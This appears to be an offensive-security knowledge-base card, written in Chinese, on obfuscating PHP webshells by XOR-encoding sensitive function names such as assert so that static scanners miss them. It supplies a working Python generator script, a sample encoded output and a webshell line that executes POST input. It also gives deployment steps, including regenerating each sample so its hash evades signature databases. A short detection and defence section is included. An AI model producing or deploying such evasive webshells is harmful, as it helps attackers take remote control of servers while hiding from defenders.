---
id: web-php-rce-webshell-xor-encoded-function-name
title: PHP 变量函数名异或编码：随机 key 逐字符 XOR 生成「$a.$b.$c」拼接式，静态无完整敏感词
type: scenario
domain: web
path: web/php/rce
technique: php-webshell-xor-encoded-function-name
tags:
- php
- webshell
- av-bypass
- obfuscation
- xor
- dynamic-call
- code-generation
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W3
  verified_at: '2026-11-08T12:56:17+08:00'
  notes: 已对照原文核对；生成脚本与原文一致；已修正样例中 mMl 变量的 key（原文截图与终端输出为 U 与 27 异或得到 r，原写 u 会得到 R），并补 hex 前导零注意点；未执行生成脚本
url: /docs/web/php/rce/web-php-rce-webshell-xor-encoded-function-name/
draft: false
kb_aliases:
- 异或免杀脚本
- XOR 生成函数名
- 逐字符异或隐藏 assert
- webshell-venom 思路
- $target=$_a.$_b.$_c
---

## 一句话结论

用「随机可打印 key」与目标函数名的每个字符逐字节异或，把结果写成 `$_x="J"^"\x2b";` 这样的独立变量，再用 `.` 拼成 `$target=$_a.$_b.$_c...`；运行时得到完整的 `assert`/`system`/任意函数名并交给 `$target($arg)` 调用。文件里既没有敏感函数名，也没有取反/Base64 那种一眼可识别的编码特征，且可用脚本批量生成、每次产出不同哈希的等价样本。

## 原理

- **PHP 字符串异或**：`"J" ^ "\x2b"` 对两个单字节做按位异或，`0x4A ^ 0x2B = 0x61` = `a`。只要 key 与目标字符在同一可打印区间内任意组合，就能表达任意 ASCII 字符，且两个操作数都是「正常可见字符」，不触发不可打印字节/十六进制长串类规则。
- **逐字符独立变量**：每个字符一个随机命名的变量（原文脚本 `random_var(3)` 生成 `$_VDj`、`$_mpd`…），既打散连续特征（正则找不到 `assert` 的子串），又让代码看起来像"一堆无关的字符串运算"。
- **拼接后即可动态调用**：`$target = $_a . $_b . ...; $target($arg);` 是 PHP 的变量函数调用，不需要 `call_user_func`、不需要 `eval`，因此连"动态调用结构"这层特征也被弱化。
- **可自动化**：原文给出生成脚本：`random_keys(len)` 从 `` `~-=!@#$%^&*_/+?<>{}|:[]abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ `` 随机取 key，按位异或输出 `\x` 十六进制（`hex()` 结果形如 `\x5f`，异或值小于 0x10 时会丢掉前导 0，需注意），再拼成 `$target=` 语句。指向任意目标串（如 `array_uintersect_uassoc` 这种长函数名）也能一次生成。
- **与按位取反（`~`）的差别**：`~` 是单目、结果通常是不可打印字节，常以 `"\x9E\x8D..."` 长串落地，易被"高密度十六进制"规则命中；异或是双目的、操作数全为可见字符，落地形态更像普通字符串常量，规避方向不同。

## 触发条件

- 目标 PHP 允许最终要调用的函数（`assert`/`system`/`array_map` 等）且请求可控参数能进到调用处；
- 文件可落地并被访问（上传/写入/包含前置独立）；
- 防护以静态特征为主；生成脚本只在攻击者本地使用，不需要目标环境有 Python。

## 利用步骤

1. 确定要还原的目标串（短如 `assert`，长如 `array_uintersect_uassoc` 用于配合冷门回调）。
2. 跑生成脚本：每个字符随机选 key，输出 `$_xxx="K"^"\xHH";` 与拼接行 `$target=$_xxx.$_yyy....;`。
3. 把生成结果嵌入 webshell，在末尾 `$target($_POST['x']);`（或配合 `__destruct`/`register_shutdown_function` 触发）。
4. 落地后先传无害内容验证（如 `x=phpinfo();`），再换实际命令。
5. 每次分发用新随机种子重新生成（同一逻辑不同字节），避免样本哈希被加入特征库。

## PoC

生成脚本（原文，改一句即可用于任意目标）：

```python
import random

def random_keys(n):
    s = '`~-=!@#$%^&*_/+?<>{}|:[]abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(s, n))

def random_var(n):
    s = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(s, n))

def xor(c1, c2):
    return hex(ord(c1) ^ ord(c2)).replace('0x', r'\x')

def generate(target):
    key = random_keys(len(target))
    func_line, call = '', '$target='
    for i in range(len(target)):
        enc = xor(target[i], key[i])
        var = random_var(3)
        func_line += f'$_{var}="{key[i]}"^"{enc}";\n'
        call += '$_%s.' % var
    print(func_line)
    print(call.rstrip('.') + ';')

generate(input('input target to generate:\r\n'))
```

生成样例（target=assert，原文实测输出）：

```text
$_VDj=">"^"\x5f";
$_mpd="#"^"\x50";
$_abv="&"^"\x55";
$_Vwm="H"^"\x2d";
$_mMl="U"^"\x27";        // 0x55^0x27=0x72 'r'
$_lLF="Y"^"\x2d";

$target=$_VDj.$_mpd.$_abv.$_Vwm.$_mMl.$_lLF;
```

```php
<?php
// 上述 6 行异或 + 拼接后：
$target($_POST['x']);   // 等价 assert($_POST['x'])
```

## 变体与关联

- 变体：key 不限于可打印集合，也可用高位字节（生成 `"\x9E"^"\xFF"` 之类），但可打印 key 更"像正常代码"。
- 变体：把 `$target` 的拼接拆到多个函数/方法里（每个函数返回一个字符），进一步打散结构。
- 变体：只对高危函数名异或，外层仍用常见入口（如 `$_POST` 取值），兼顾可读性与免杀。
- 关联：[[web-php-rce-webshell-string-not-dynamic-call-av-bypass]]（按位取反 `~` 的同族手法，编码方向不同）。
- 关联：[[web-php-rce-webshell-obscure-callback-uintersect]]（本卡生成的函数名常用于把冷门回调函数也一起隐藏）。
- 关联：[[web-php-rce-webshell-junk-comment-nul-padding]]（形态稀释的另一维度）。
- 边界：若扫描器做常量折叠/字节码还原（静态求值异或表达式），仍可能还原出函数名；仅靠字符串层隐藏对强 AST/字节码分析不够。

## 检测与防御

- 检测：识别"大量 `X ^ Y` 字符串表达式 + 变量拼接 + 变量函数调用"的组合；静态常量折叠可还原最终函数名，应作为规则实现；运行时监控变量函数调用与 `assert`/`system` 行为。
- 防御：`disable_functions` 覆盖执行类函数；禁用 `assert` 字符串模式；上传目录禁解析；用支持表达式求值的检测引擎（而非纯正则）。
